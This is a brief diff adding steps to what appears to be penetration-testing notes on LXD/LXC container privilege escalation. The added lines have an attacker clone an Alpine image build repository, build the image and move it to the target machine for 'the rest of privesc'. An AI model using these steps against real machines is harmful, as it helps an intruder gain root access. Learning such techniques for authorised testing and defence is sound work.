@@ -2,6 +2,12 @@
 
 ## Steps:
 
+### Attacker: git clone https://github.com/alpinelinux/docker-alpine
+
+### sudo ./build-alpine -a i686
+
+### Transfer to machine for rest of privesc
+
 #### 1) lxc image list
 
 #### 2) Upload image to target
